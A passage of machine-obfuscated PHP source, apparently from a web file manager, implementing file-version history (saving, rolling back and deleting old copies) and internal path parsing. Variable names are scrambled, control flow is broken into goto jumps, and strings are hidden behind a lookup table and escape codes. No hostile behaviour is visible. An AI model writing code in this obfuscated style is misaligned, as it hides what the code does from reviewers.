get_path_father($cë©áÛ‘Æ); if (!$aŞ¥Ò¤Æ[$E‡²ŒìÉ”]) { $aŞ¥Ò¤Æ[$E‡²ŒìÉ”] = array(); } $aŞ¥Ò¤Æ[$E‡²ŒìÉ”][] = get_path_this($cë©áÛ‘Æ); } foreach ($aŞ¥Ò¤Æ as $E‡²ŒìÉ” => $döğ­Ä×áÓ) { $AÃÅ×¹‘¼ = self::parsePath($E‡²ŒìÉ”); if (!$AÃÅ×¹‘¼) { continue; } foreach ($döğ­Ä×áÓ as $E°ÊÔ›ÓÎí) { $dÎ……²Àğ³ = self::listData(rtrim($AÃÅ×¹‘¼, $f…­‚°†Ğ[8]) . $f…­‚°†Ğ[8] . $E°ÊÔ›ÓÎí, !1); if ($dÎ……²Àğ³ && $dÎ……²Àğ³[$f…­‚°†Ğ[376]]) { $c“ãë›Ú§ [rtrim($E‡²ŒìÉ”, $f…­‚°†Ğ[8]) . $f…­‚°†Ğ[8] . $E°ÊÔ›ÓÎí] = count($dÎ……²Àğ³[$f…­‚°†Ğ[376]]); } } } return $c“ãë›Ú§ ; } public static function add($d‘¸¥á¸‡) { goto DİÑ’øÚË; b¶ìœÌˆ‘: $AÈÀ×À÷ô± = Model($A‹ÓèëÇ¹ª[739])->get($A‹ÓèëÇ¹ª[1127]); $CóˆÊÃ¾öì = $GLOBALS[$A‹ÓèëÇ¹ª[6]][$A‹ÓèëÇ¹ª[98]][$A‹ÓèëÇ¹ª[1105]]; $C¡¹¯‹ºº = $AÈÀ×À÷ô± == $A‹ÓèëÇ¹ª[1128] ? 5 : $CóˆÊÃ¾öì; goto d¦é™Ş¢ö’; b¦»ë‚¾øÒ: if (!$Cõ—­îÕ‚à) { self::clearEmptyFolder($CÓ¸¸µÊö³[$A‹ÓèëÇ¹ª[1131]]); return !1; } array_unshift($B­‚°Û—À, $a³æº””è); if (count($B­‚°Û—À) > $C¡¹¯‹ºº) { $c†ì‹¬»ô = array_slice($B­‚°Û—À, $C¡¹¯‹ºº); foreach ($c†ì‹¬»ô as $D¡ª–¶ÏŒß) { IO::remove($CÓ¸¸µÊö³[$A‹ÓèëÇ¹ª[1131]] . $D¡ª–¶ÏŒß[$A‹ÓèëÇ¹ª[28]]); } $B­‚°Û—À = array_slice($B­‚°Û—À, 0, $C¡¹¯‹ºº); } goto DÖ¹‹¨‚×ë; DÖ¹‹¨‚×ë: return self::saveData($CÓ¸¸µÊö³[$A‹ÓèëÇ¹ª[1132]], $B­‚°Û—À); goto Cöøù„ä¨; d¦é™Ş¢ö’: if ($CóˆÊÃ¾öì <= 0) { return; } $cÙÚìƒ¨Ó© = IO::hashSimple($d‘¸¥á¸‡); $aêàîÑƒ”Í = IO::info($d‘¸¥á¸‡); goto cçª‘™÷·‚; BÑ£”´Ø­‘: if ($B­‚°Û—À && $B­‚°Û—À[0][$A‹ÓèëÇ¹ª[181]] == $cÙÚìƒ¨Ó©) { return !0; } if (array_key_exists($A‹ÓèëÇ¹ª[206], $aêàîÑƒ”Í) && !$aêàîÑƒ”Í[$A‹ÓèëÇ¹ª[206]]) { return !1; } $c…Ê‘¯Ã¯§ = short_id(time()); goto cÕŸ¬ğËÃ; cçª‘™÷·‚: $B­‚°Û—À = $CÓ¸¸µÊö³[$A‹ÓèëÇ¹ª[376]]; if ($aêàîÑƒ”Í[$A‹ÓèëÇ¹ª[88]] == 0) { return; } if ($aêàîÑƒ”Í[$A‹ÓèëÇ¹ª[88]] >= 1024 * 1024 * 500) { return !1; } goto BÑ£”´Ø­‘; cÕŸ¬ğËÃ: $a³æº””è = array($A‹ÓèëÇ¹ª[402] => $c…Ê‘¯Ã¯§, $A‹ÓèëÇ¹ª[181] => $cÙÚìƒ¨Ó©, $A‹ÓèëÇ¹ª[28] => $aêàîÑƒ”Í[$A‹ÓèëÇ¹ª[28]] . $A‹ÓèëÇ¹ª[105] . date($A‹ÓèëÇ¹ª[1129]) . rand_string(1), $A‹ÓèëÇ¹ª[88] => $aêàîÑƒ”Í[$A‹ÓèëÇ¹ª[88]], $A‹ÓèëÇ¹ª[441] => USER_ID, $A‹ÓèëÇ¹ª[204] => time(), $A‹ÓèëÇ¹ª[1130] => $A‹ÓèëÇ¹ª[33]); IO::mkdir($CÓ¸¸µÊö³[$A‹ÓèëÇ¹ª[1131]]); $Cõ—­îÕ‚à = IO::copy($d‘¸¥á¸‡, $CÓ¸¸µÊö³[$A‹ÓèëÇ¹ª[1131]], !1, $a³æº””è[$A‹ÓèëÇ¹ª[28]]); goto b¦»ë‚¾øÒ; DİÑ’øÚË: $A‹ÓèëÇ¹ª =& $_SERVER[Ü˜]; $CÓ¸¸µÊö³ = self::listData($d‘¸¥á¸‡); if (!$CÓ¸¸µÊö³) { return; } goto b¶ìœÌˆ‘; Cöøù„ä¨: } public static function remove($C”×ï»•àõ, $E¸øñÍ¯—â) { $FãËªÙ¯‘² =& $_SERVER[Ü˜]; $A»ƒÜæ¯×‡ = self::listData($C”×ï»•àõ); $EìÒÛëôÁÃ = array(); if (!$A»ƒÜæ¯×‡) { return !1; } foreach ($A»ƒÜæ¯×‡[$FãËªÙ¯‘²[376]] as $A…Ûœ÷®“ˆ) { if ($A…Ûœ÷®“ˆ[$FãËªÙ¯‘²[402]] == $E¸øñÍ¯—â) { IO::remove($A»ƒÜæ¯×‡[$FãËªÙ¯‘²[1131]] . $A…Ûœ÷®“ˆ[$FãËªÙ¯‘²[28]]); continue; } $EìÒÛëôÁÃ[] = $A…Ûœ÷®“ˆ; } return self::saveData($A»ƒÜæ¯×‡[$FãËªÙ¯‘²[1132]], $EìÒÛëôÁÃ); } public static function clear($DÒåøŸˆš, $CÙì¼òÍÍŒ = true) { $d•ƒÅÆÍ³– =& $_SERVER[Ü˜]; $b¥·¬´–æ» = self::listData($DÒåøŸˆš, $CÙì¼òÍÍŒ); if (!$b¥·¬´–æ») { return !1; } foreach ($b¥·¬´–æ»[$d•ƒÅÆÍ³–[376]] as $e¤Éî„‚“†) { IO::remove($b¥·¬´–æ»[$d•ƒÅÆÍ³–[1131]] . $e¤Éî„‚“†[$d•ƒÅÆÍ³–[28]]); } return self::saveData($b¥·¬´–æ»[$d•ƒÅÆÍ³–[1132]], array()); } public static function moveHistory($A¨–¹é»É·, $CµŸ¢±‘ = '', $B‚ƒĞªõ¾Ò = '') { goto eÇÄÙ¡ÈŠ; eÇÄÙ¡ÈŠ: $c —ïê‹¢‰ =& $_SERVER[Ü˜]; $BØŒç–ˆì‡ = self::listData($A¨–¹é»É·, !1); if (!$BØŒç–ˆì‡ || !$BØŒç–ˆì‡[$c —ïê‹¢‰[376]]) { return !1; } goto Aòè…Ü¢Âµ; eÇİ¹ÒÍº: self::saveData($BØŒç–ˆì‡[$c —ïê‹¢‰[1132]], $BØŒç–ˆì‡[$c —ïê‹¢‰[376]]); self::clearEmptyFolder($BØŒç–ˆì‡[$c —ïê‹¢‰[1131]]); goto AÄ×Öµšº¼; Aòè…Ü¢Âµ: $D”î¼ÜÜØ§ = $c —ïê‹¢‰[1119]; $CµŸ¢±‘ = $CµŸ¢±‘ ? $CµŸ¢±‘ : get_path_this($A¨–¹é»É·); $B‚ƒĞªõ¾Ò = $B‚ƒĞªõ¾Ò ? $B‚ƒĞªõ¾Ò : $BØŒç–ˆì‡[$c —ïê‹¢‰[1131]]; goto F‡‚ğŒ¦ó‰; F‡‚ğŒ¦ó‰: $A¨ÃÔáàî = substr(get_path_this($BØŒç–ˆì‡[$c —ïê‹¢‰[1132]]), 0, -strlen($D”î¼ÜÜØ§)); foreach ($BØŒç–ˆì‡[$c —ïê‹¢‰[376]] as $eŒÆ‘‹¥Ú => $FÒ‡ö‡ŒöÔ) { $AŠÜÄÜÉ¦¦ = $CµŸ¢±‘ . substr($FÒ‡ö‡ŒöÔ[$c —ïê‹¢‰[28]], strlen($A¨ÃÔáàî)); $Bƒ•µà™ó = IO::move($BØŒç–ˆì‡[$c —ïê‹¢‰[1131]] . $FÒ‡ö‡ŒöÔ[$c —ïê‹¢‰[28]], $B‚ƒĞªõ¾Ò, !1, $AŠÜÄÜÉ¦¦); if ($Bƒ•µà™ó) { $BØŒç–ˆì‡[$c —ïê‹¢‰[376]][$eŒÆ‘‹¥Ú][$c —ïê‹¢‰[28]] = $AŠÜÄÜÉ¦¦; } } $BØŒç–ˆì‡[$c —ïê‹¢‰[1132]] = IO::move($BØŒç–ˆì‡[$c —ïê‹¢‰[1132]], $B‚ƒĞªõ¾Ò, !1, $CµŸ¢±‘ . $D”î¼ÜÜØ§); goto eÇİ¹ÒÍº; AÄ×Öµšº¼: } public static function rollback($eÒ§ÏåÄ¾Æ, $BŠ«ŞÜµ÷º) { $d…¢ñôéÅë =& $_SERVER[Ü˜]; $d¾à‘õÆ¥­ = self::listData($eÒ§ÏåÄ¾Æ); if (!$d¾à‘õÆ¥­) { return; } $aÌÄÄçƒ·â = IO::info($eÒ§ÏåÄ¾Æ); foreach ($d¾à‘õÆ¥­[$d…¢ñôéÅë[376]] as $A©ì‚í‰¹¾ => $FåÛ™’á©–) { if ($FåÛ™’á©–[$d…¢ñôéÅë[402]] == $BŠ«ŞÜµ÷º) { self::add($eÒ§ÏåÄ¾Æ); $d´ãİ”Ø² = $d¾à‘õÆ¥­[$d…¢ñôéÅë[1131]] . $FåÛ™’á©–[$d…¢ñôéÅë[28]]; $FÁÙ¬‡ÀÄ­ = IO::copy($d´ãİ”Ø², IO::pathFather($eÒ§ÏåÄ¾Æ), REPEAT_REPLACE, $aÌÄÄçƒ·â[$d…¢ñôéÅë[28]]); if ($FÁÙ¬‡ÀÄ­) { self::remove($eÒ§ÏåÄ¾Æ, $BŠ«ŞÜµ÷º); } return $FÁÙ¬‡ÀÄ­; } } return !1; } public static function setDetail($c—ãæ»à—, $f‘õò ¦¸, $Eó¾‹Öò¶) { $bÄªæÑ‘Öê =& $_SERVER[Ü˜]; $E¤äßŠÄ¿¹ = self::listData($c—ãæ»à—); if (!$E¤äßŠÄ¿¹) { return; } foreach ($E¤äßŠÄ¿¹[$bÄªæÑ‘Öê[376]] as $Ašß¨·ïÅ¦ => $bÓ áÓì²¶) { if ($bÓ áÓì²¶[$bÄªæÑ‘Öê[402]] == $f‘õò ¦¸) { $E¤äßŠÄ¿¹[$bÄªæÑ‘Öê[376]][$Ašß¨·ïÅ¦][$bÄªæÑ‘Öê[1130]] = $Eó¾‹Öò¶; self::saveData($E¤äßŠÄ¿¹[$bÄªæÑ‘Öê[1132]], $E¤äßŠÄ¿¹[$bÄªæÑ‘Öê[376]]); return !0; } } return !1; } public static function fileInfo($Aº‹àĞé‚, $DÕÓ¡­‚®) { goto d…©ÊÀ­¹; d…©ÊÀ­¹: $D¶ÚóË¨‹‰ =& $_SERVER[Ü˜]; $aŠŞæ÷¹óò = self::listData($Aº‹àĞé‚); if (!$aŠŞæ÷¹óò) { show_json(LNG($D¶ÚóË¨‹‰[115]), !1); } goto B‡¡¸ôÓÜÙ; F¥²ùùµœÎ: return IO::info($c·‡…ÓÔ¶); goto Eâ‡¢ãà°Û; B‡¡¸ôÓÜÙ: $c·‡…ÓÔ¶ = $D¶ÚóË¨‹‰[33]; foreach ($aŠŞæ÷¹óò[$D¶ÚóË¨‹‰[376]] as $AÏ†“»ÁáÆ => $a¹Âà”Ÿ ) { if ($a¹Âà”Ÿ [$D¶ÚóË¨‹‰[402]] != $DÕÓ¡­‚®) { continue; } $c·‡…ÓÔ¶ = $aŠŞæ÷¹óò[$D¶ÚóË¨‹‰[1131]] . $a¹Âà”Ÿ [$D¶ÚóË¨‹‰[28]]; break; } if (!$c·‡…ÓÔ¶) { show_json(LNG($D¶ÚóË¨‹‰[115]), !1); } goto F¥²ùùµœÎ; Eâ‡¢ãà°Û: } public static function fileOut($Dô»ğ¶£, $fÑ±Ë›“²Ê, $Fƒ¿ÕñÍÓï = false) { $a„¸ÏÁ =& $_SERVER[Ü˜]; $f×Ï„„½¦ë = self::fileInfo($Dô»ğ¶£, $fÑ±Ë›“²Ê); $cÁ—¾³’› =& $GLOBALS[$a„¸ÏÁ[7]]; $Fƒ¿ÕñÍÓï = isset($cÁ—¾³’›[$a„¸ÏÁ[1095]]) && $cÁ—¾³’›[$a„¸ÏÁ[1095]] == 1; if (isset($cÁ—¾³’›[$a„¸ÏÁ[29]]) && $cÁ—¾³’›[$a„¸ÏÁ[29]] == $a„¸ÏÁ[1133]) { return IO::fileOutImage($f×Ï„„½¦ë[$a„¸ÏÁ[86]], $cÁ—¾³’›[$a„¸ÏÁ[1134]]); } IO::fileOut($f×Ï„„½¦ë[$a„¸ÏÁ[86]], $Fƒ¿ÕñÍÓï, get_path_this($Dô»ğ¶£)); } public static function listData($cìÇ´ÔÂŒ­, $eŸ…ª³óß = true) { goto FÚĞ‹º‚Çª; B¯™äˆîÒ¶: if (substr($cìÇ´ÔÂŒ­, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $F—·…±Ö = self::pathHistory($cìÇ´ÔÂŒ­); $c‚ÊÇï‘²÷ = array($FÚê²¸†•‹[1132] => $F—·…±Ö . $FÚê²¸†•‹[1119], $FÚê²¸†•‹[1131] => rtrim(get_path_father($F—·…±Ö), $FÚê²¸†•‹[8]) . $FÚê²¸†•‹[8], $FÚê²¸†•‹[376] => array()); goto AÇ£±é„¦¬; AÇ£±é„¦¬: $e©—â­­İ = IO::getContent($c‚ÊÇï‘²÷[$FÚê²¸†•‹[1132]]); if ($e©—â­­İ) { $a¿Ñ…Û¶ÔÁ = json_decode($e©—â­­İ, !0); if (is_array($a¿Ñ…Û¶ÔÁ)) { $c‚ÊÇï‘²÷[$FÚê²¸†•‹[376]] = $a¿Ñ…Û¶ÔÁ; } } return $c‚ÊÇï‘²÷; goto f‹ÑäŸª¯î; FÚĞ‹º‚Çª: $FÚê²¸†•‹ =& $_SERVER[Ü˜]; if ($eŸ…ª³óß && !IO::exist($cìÇ´ÔÂŒ­)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto B¯™äˆîÒ¶; f‹ÑäŸª¯î: } private static function saveData($B‰Ø– ½¸ƒ, $c§’ºÔáõ­) { goto Eàï¡ãİ‚—; dÜ½¸•åº³: $AêÚ»µ”¦É = IO::pathFather($B‰Ø– ½¸ƒ); IO::remove($B‰Ø– ½¸ƒ); self::clearEmptyFolder($AêÚ»µ”¦É); goto dîƒ’Ï£¤÷; dîƒ’Ï£¤÷: return !0; goto B¿‹½›Î¿; Eàï¡ãİ‚—: $cšåÎÃ‹ßŒ =& $_SERVER[Ü˜]; self::log($cšåÎÃ‹ßŒ[1135] . $B‰Ø– ½¸ƒ . $cšåÎÃ‹ßŒ[78] . count($c§’ºÔáõ­), $cšåÎÃ‹ßŒ[721]); if ($c§’ºÔáõ­) { return IO::setContent($B‰Ø– ½¸ƒ, json_encode($c§’ºÔáõ­)); } goto dÜ½¸•åº³; B¿‹½›Î¿: } public static function clearEmptyFolder($aêÅÛˆÑ»µ) { goto Cä³ğ òãØ; Cä³ğ òãØ: $DË®öš¼ƒã =& $_SERVER[Ü˜]; if (trim($aêÅÛˆÑ»µ, $DË®öš¼ƒã[8]) == trim(self::$_historyBase, $DË®öš¼ƒã[8])) { return; } $aÍˆ¢¶°Ò° = IO::pathFather($aêÅÛˆÑ»µ); goto f¬ì±§÷Ğ; B©ÀºÑš’÷: self::clearEmptyFolder($aÍˆ¢¶°Ò°); goto cÈœÓ¾Ó£; f¬ì±§÷Ğ: $a¨ã–óó²Ó = IO::has($aêÅÛˆÑ»µ, !0); if ($a¨ã–óó²Ó[$DË®öš¼ƒã[213]] > 0 || $a¨ã–óó²Ó[$DË®öš¼ƒã[214]] > 0) { return; } IO::remove($aêÅÛˆÑ»µ); goto B©ÀºÑš’÷; cÈœÓ¾Ó£: } private static function getBasePath() { goto C‚¤È…æ…Ê; c¬‚ö…‡à: $Eò«‚¼˜ßá = DATA_PATH . $Aƒ¿™°ñŞÖ[1138] . rand_string(8) . $Aƒ¿™°ñŞÖ[8]; $Eò«‚¼˜ßá = IO::mkdir($Eò«‚¼˜ßá); $Eò«‚¼˜ßá = rtrim($Eò«‚¼˜ßá, $Aƒ¿™°ñŞÖ[8]) . $Aƒ¿™°ñŞÖ[8]; goto f »åŠŒî; fà›ù¦Àë: return $Eò«‚¼˜ßá; goto e©¬Öîš‘ä; f »åŠŒî: file_put_contents($Eò«‚¼˜ßá . $Aƒ¿™°ñŞÖ[1139], $Aƒ¿™°ñŞÖ[33]); file_put_contents(DATA_PATH . $Aƒ¿™°ñŞÖ[1139], $Aƒ¿™°ñŞÖ[33]); Model($Aƒ¿™°ñŞÖ[1136])->set($Aƒ¿™°ñŞÖ[1137], $Eò«‚¼˜ßá); goto fà›ù¦Àë; C‚¤È…æ…Ê: $Aƒ¿™°ñŞÖ =& $_SERVER[Ü˜]; $Eò«‚¼˜ßá = Model($Aƒ¿™°ñŞÖ[1136])->get($Aƒ¿™°ñŞÖ[1137]); if (IO::exist($Eò«‚¼˜ßá)) { if (get_path_this($Eò«‚¼˜ßá) == $Aƒ¿™°ñŞÖ[1122]) { $dÊ‰÷Ş´Ø = $Aƒ¿™°ñŞÖ[1138] . rand_string(8); @rename($Eò«‚¼˜ßá, get_path_father($Eò«‚¼˜ßá) . $Aƒ¿™°ñŞÖ[8] . $dÊ‰÷Ş´Ø); $Eò«‚¼˜ßá = DATA_PATH . $dÊ‰÷Ş´Ø . $Aƒ¿™°ñŞÖ[8]; file_put_contents(DATA_PATH . $Aƒ¿™°ñŞÖ[1139], $Aƒ¿™°ñŞÖ[33]); Model($Aƒ¿™°ñŞÖ[1136])->set($Aƒ¿™°ñŞÖ[1137], $Eò«‚¼˜ßá); } return $Eò«‚¼˜ßá; } goto c¬‚ö…‡à; e©¬Öîš‘ä: } } class KodIO { const KOD_SOURCE = "\173\163\157\x75\162\x63\145\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\x73\145\162\x52\x65\143\171\x63\154\145\175"; const KOD_USER_FAV = "\173\165\x73\145\162\x46\x61\166\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\145\x72\106\x69\154\x65\x54\141\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\145\x72\x46\151\x6c\145\124\x79\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\x6f\x75\x70\x52\157\x6f\164\x53\x65\154\x66\x7d"; const KOD_USER_SHARE = "\173\x75\163\145\162\x53\150\x61\162\145\175"; const KOD_USER_SHARE_LINK = "\173\165\x73\x65\x72\123\150\141\x72\x65\x4c\151\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\141\162\145\x54\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\150\x61\x72\x65\x49\x74\145\x6d\175"; const KOD_SHARE_LINK = "\173\163\x68\x61\x72\145\111\x74\145\x6d\x4c\151\156\x6b\175"; const KOD_SEARCH = "\173\163\145\x61\162\143\150\x7d"; const KOD_BLOCK = "\x7b\142\x6c\x6f\143\153\175"; const KOD_IO = "\x7b\151\157\175"; const KOD_USER_RECENT = "\x7b\165\163\x65\162\122\145\x6e\x63\145\x6e\x74\x7d"; const KOD_USER_DRIVER = "\x7b\144\162\x69\166\x65\x72\175"; public static function typeList() { $E§ºñ×ğŠ =& $_SERVER[Ü˜]; return array($E§ºñ×ğŠ[1140] => self::KOD_SOURCE, $E§ºñ×ğŠ[1141] => self::KOD_USER_RECYCLE, $E§ºñ×ğŠ[1142] => self::KOD_USER_FAV, $E§ºñ×ğŠ[1143] => self::KOD_USER_FILE_TAG, $E§ºñ×ğŠ[1144] => self::KOD_USER_FILE_TYPE, $E§ºñ×ğŠ[1145] => self::KOD_GROUP_ROOT_SELF, $E§ºñ×ğŠ[1146] => self::KOD_USER_SHARE, $E§ºñ×ğŠ[1147] => self::KOD_USER_SHARE_LINK, $E§ºñ×ğŠ[1148] => self::KOD_USER_SHARE_TO_ME, $E§ºñ×ğŠ[1149] => self::KOD_SHARE_ITEM, $E§ºñ×ğŠ[1150] => self::KOD_SHARE_LINK, $E§ºñ×ğŠ[1151] => self::KOD_SEARCH, $E§ºñ×ğŠ[1152] => self::KOD_BLOCK, $E§ºñ×ğŠ[1153] => self::KOD_IO, $E§ºñ×ğŠ[1154] => self::KOD_USER_RECENT, $E§ºñ×ğŠ[1155] => self::KOD_USER_DRIVER); } public static function parse($FÚ¿ÁÄœ§) { goto c½“ˆÌùø; c½“ˆÌùø: $d™¯Ùæ×Ş… =& $_SERVER[Ü˜]; $FÚ¿ÁÄœ§ = self::clear($FÚ¿ÁÄœ§); $f†¬ĞóÓ“ = array_values(self::typeList()); goto aôŒÉŒ¨‚İ; c¤Ô–Òî—: $C³ªéó—¦Õ = array($d™¯Ùæ×Ş…[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $a¡‚Ğƒ¦Ã´[$d™¯Ùæ×Ş…[1121]] = in_array($a¡‚Ğƒ¦Ã´[$d™¯Ùæ×Ş…[29]], $C³ªéó—¦Õ); return $a¡‚Ğƒ¦Ã´; goto CöÈˆ‰¡…; aôŒÉŒ¨‚İ: preg_match($d™¯Ùæ×Ş…[1156], $FÚ¿ÁÄœ§, $eÉçØ—„¤ù); $a¡‚Ğƒ¦Ã´ = array($d™¯Ùæ×Ş…[424] => !1, $d™¯Ùæ×Ş…[1157] => !1, $d™¯Ùæ×Ş…[421] => !1, $d™¯Ùæ×Ş…[86] => $FÚ¿ÁÄœ§, $d™¯Ùæ×Ş…[1066] => !1, $d™¯Ùæ×Ş…[1065] => $d™¯Ùæ×Ş…[33]); if (is_array($eÉçØ—„¤ù) && count($eÉçØ—„¤ù) == 5) { $d†Ôƒ‡ˆ¾´ = $d™¯Ùæ×Ş…[1158] . $eÉçØ—„¤ù[2] . $d™¯Ùæ×Ş…[334]; if (in_array($d†Ôƒ‡ˆ¾´, $f†¬ĞóÓ“)) { $a¡‚Ğƒ¦Ã´[$d™¯Ùæ×Ş…[1066]] = $eÉçØ—„¤ù[1]; $a¡‚Ğƒ¦Ã´[$d™¯Ùæ×Ş…[29]] = $d†Ôƒ‡ˆ¾´; $a¡‚Ğƒ¦Ã´[$d™¯Ùæ×Ş…[1159]] = substr($d†Ôƒ‡ˆ¾´, 1, -1); $a¡‚Ğƒ¦Ã´[$d™¯Ùæ×Ş…[402]] = $eÉçØ—„¤ù[3]; } $a¡‚Ğƒ¦Ã´[$d™¯Ùæ×Ş…[1065]] = $eÉçØ—„¤ù[4]; } goto c¤Ô–Òî—; CöÈˆ‰¡…: } public static function isTruePath($BÚêĞ†¹­) { goto bßÀŠ²ùĞ¦; bßÀŠ²ùĞ¦: $fåå¾›ùÙå =& $_SERVER[Ü˜]; if (substr($BÚêĞ†¹­, 0, 1) != $fåå¾›ùÙå[1158]) { return !0; } if (strpos($BÚêĞ†¹­, $fåå¾›ùÙå[410]) === 0) { return !0; } goto AïÌÃ‚Üê«; AïÌÃ‚Üê«: if (strpos($BÚêĞ†¹­, $fåå¾›ùÙå[1125]) === 0) { return !0; } if (strpos($BÚêĞ†¹­, $fåå¾›ùÙå[1160]) === 0) { return !0; } if (strpos($BÚêĞ†¹­, $fåå¾›ùÙå[1161]) === 0) { return !0; } goto f“ÆÁÔ‚°Ê; f“ÆÁÔ‚°Ê: if (strpos($BÚêĞ†¹­, $fåå¾›ùÙå[1162]) === 0) { return !0; } return !1; goto bÀ¢š÷«¼î; bÀ¢š÷«¼î: } public static function clear($Bôƒ…¶¢ãß) { goto a„’ò¼»¸; D—î´Ø…àç: $fÓê–¾»È = $fœ…õéÊëÜ[1163]; if (substr($Bôƒ…¶¢ãß, 0, 3) == $fœ…õéÊëÜ[1164]) { $Bôƒ…¶¢ãß = substr($Bôƒ…¶¢ãß, 3); } while (strstr($Bôƒ…¶¢ãß, $fÓê–¾»È)) { $Bôƒ…¶¢ãß = str_replace($fÓê–¾»È, $fœ…õéÊëÜ[8], $Bôƒ…¶¢ãß); } goto d‘øàº›Ğ; d‘øàº›Ğ: $Bôƒ…¶¢ãß = preg_replace($fœ…õéÊëÜ[1165], $fœ…õéÊëÜ[8], $Bôƒ…¶¢ãß); if ($Bôƒ…¶¢ãß == $fœ…õéÊëÜ[8]) { return $fœ…õéÊëÜ[8]; } $Bôƒ…¶¢ãß = rtrim($Bôƒ…¶¢ãß, $fœ…õéÊëÜ[8]); goto eœæŸ¦é«; eœæŸ¦é«: return $Bôƒ…¶¢ãß; goto d¹ê‘í«­î; a„’ò¼»¸: $fœ…õéÊëÜ =& $_SERVER[Ü˜]; $Bôƒ…¶¢ãß = str_replace(array($fœ…õéÊëÜ[1039], $fœ…õéÊëÜ[63]), $fœ…õéÊëÜ[50], $Bôƒ…¶¢ãß); $Bôƒ…¶¢ãß = str_replace($fœ…õéÊëÜ[107], $fœ…õéÊëÜ[8], $Bôƒ…¶¢ãß); goto D—î´Ø…àç; d¹ê‘í«­î: } public static function sourceID($CÎğÏˆÜÀß) { $EÄÂ‡«±å =& $_SERVER[Ü˜]; $a¼º®ó£¬£ = self::parse($CÎğÏˆÜÀß); if ($a¼º®ó£¬£[$EÄÂ‡«±å[29]] !== self::KOD_SOURCE) { show_json(LNG($EÄÂ‡«±å[1166]), !1); } return $a¼º®ó£¬£[$EÄÂ‡«±å[402]]; } public static function make($B¬‚ÈÊ¶´¨) { if (!$B¬‚ÈÊ¶´¨) { return !1; } return self::makePath(self::KOD_SOURCE, intval($B¬‚ÈÊ¶´¨)); } public static function makeShare($A‘î¼âù†¯, $f”ÌÈå×œµ) { return self::makePath(self::KOD_SHARE_ITEM, $A‘î¼âù†¯, $f”ÌÈå×œµ); } public static function makeFileTypePath($B¢œ¶•Ãô) { return self::makePath(self::KOD_USER_FILE_TYPE, $B¢œ¶•Ãô); } public static function makeFileTagPath($eç’œ…ã†) { return self::makePath(self::KOD_USER_FILE_TAG, $eç’œ…ã†); } public static function makePath($d·øœÂ•Í», $e—¤ò¸«²† = '', $eçˆôõö“ = '') { $B¶‡µ‹ÃøÍ =& $_SERVER[Ü˜]; $a™áÛÀäàš = substr($d·øœÂ•Í», 1, -1); $Bä¾åöÏ = $B¶‡µ‹ÃøÍ[1167] . $a™áÛÀäàš . $B¶‡µ‹ÃøÍ[1168] . $e—¤ò¸«²† . $B¶‡µ‹ÃøÍ[1169]; $Bä¾åöÏ = $eçˆôõö“ ? $Bä¾åöÏ . $eçˆôõö“ . $B¶‡µ‹ÃøÍ[8] : $Bä¾åöÏ; return $Bä¾åöÏ; } public static function hashPath($cØßó‰¥Å­, $a‰‹ª«¤Ö = true) { goto a†ï‰ºîëï; a†ï‰ºîëï: $e‰±åª±óã =& $_SERVER[Ü˜]; $D‰ˆ†°ßä = is_array($cØßó‰¥Å­) ? $cØßó‰¥Å­ : IO::info($cØßó‰¥Å­); $BØˆ½¢ÒÚµ = _get($D‰ˆ†°ßä, $e‰±åª±óã[1170], $e‰±åª±óã[33]); goto Còµñ‘è„î; Còµñ‘è„î: if (!$BØˆ½¢ÒÚµ && isset($D‰ˆ†°ßä[$e‰±åª±óã[404]])) { $D‰ˆ†°ßä = IO::info(KodIO::make($D‰ˆ†°ßä[$e‰±åª±óã[404]])); $BØˆ½¢ÒÚµ = _get($D‰ˆ†°ßä, $e‰±åª±óã[1170], $e‰±åª±óã[33]); } if (!$BØˆ½¢ÒÚµ && $a‰‹ª«¤Ö) { $fÓ†º×‰™ = KodIO::parse($D‰ˆ†°ßä[$e‰±åª±óã[86]]); if (!$fÓ†º×‰™[$e‰±åª±óã[29]]) { $BØˆ½¢ÒÚµ = IO::hashSimple($D‰ˆ†°ßä[$e‰±åª±óã[86]]); } } if (!$BØˆ½¢ÒÚµ) { $BØˆ½¢ÒÚµ = md5($D‰ˆ†°ßä[$e‰±åª±óã[86]] . $D‰ˆ†°ßä[$e‰±åª±óã[88]] . $D‰ˆ†°ßä[$e‰±åª±óã[94]]); } goto bğê²»À’Â; bğê²»À’Â: return $BØˆ½¢ÒÚµ; goto eƒ§´¬é; eƒ§´¬é: } public static function initSystemPath() { goto C¨ÖÓâ©ÂÙ; dÎ“Ä¨²‰„: IOHistory::bindEvent(); goto eÎƒ†¼ì Â; C¨ÖÓâ©ÂÙ: $fàÚÊ£¾Ä¯ =& $_SERVER[Ü˜]; if (defined($fàÚÊ£¾Ä¯[1171])) { return; } define($fàÚÊ£¾Ä¯[1171], self::systemPath($fàÚÊ£¾Ä¯[1172])); goto F©…ĞŠ«¿‡; F©…ĞŠ«¿‡: define($fàÚÊ£¾Ä¯[1173], self::systemPath($fàÚÊ£¾Ä¯[1174])); define($fàÚÊ£¾Ä¯[1175], self::systemPath($fàÚÊ£¾Ä¯[1176])); define($fàÚÊ£¾Ä¯[1177], self::systemPath($fàÚÊ£¾Ä¯[1178])); goto dÎ“Ä¨²‰„; eÎƒ†¼ì Â: } public static function systemPath($BÏÉ¸ğÚµ) { goto c¥­ÖÊğ‡‰; a¬†ª³ÏÈÀ: return $b×æÙ“šğŞ; goto d­æÔ„š‡; e¦õ†ŠÜ˜É: if ($b×æÙ“šğŞ) { return $b×æÙ“šğŞ; } if ($BÏÉ¸ğÚµ == $Fï‡¹Õ¿ğ[1172]) { $b×æÙ“šğŞ = self::make(Model($Fï‡¹Õ¿ğ[799])->systemRootPathAdd($Fï‡¹Õ¿ğ[514])); } else { $b×æÙ“šğŞ = self::systemPath($Fï‡¹Õ¿ğ[1172]); $d¬ß‚‚ßñè = self::sourceID($b×æÙ“šğŞ); $b×æÙ“šğŞ = self::make(Model($Fï‡¹Õ¿ğ[799])->mkdir($d¬ß‚‚ßñè, $BÏÉ¸ğÚµ)); } 